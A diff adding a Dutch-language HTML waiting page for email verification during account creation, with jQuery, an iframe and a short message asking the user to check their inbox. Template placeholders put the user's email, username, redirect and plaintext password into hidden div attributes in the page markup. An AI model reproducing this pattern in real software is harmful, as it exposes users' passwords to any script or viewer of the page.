@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Email Verificatie</title>
+
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+    <script src="waitEmail/index.js"></script>
+    <link rel="stylesheet" type="text/css" href="waitEmail/index.css">
+
+    <div id="email" class="|email|"></div>
+    <div id="password" class="|password|"></div>
+    <div id="username" class="|username|"></div>
+    <div id="redirect" class="|redirect|"></div>
+
+    <!--|/  Fonts  \|-->
+    <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet">
+    <!--|/  End fonts  \|-->
+
+</head>
+
+<body onload="onload()" id="body" style="cursor: wait;">
+
+    <iframe id="iframe"></iframe>
+    <div id="iframeShade"></div>
+
+    <div id="border" style="display: none">
+        <div><b class="verification">Verificatie</b></div>
+        <div>
+            <p class="text">
+                We hebben je een email gestuurd voor email verificatie. Open deze email en je kan verder met je account
+                maken. Als je de email niet ontvangen hebt, kijk dan in spam of wacht een paar minuten.
+            </p>
+        </div>
+    </div>
+
+</body>
+
+</html>
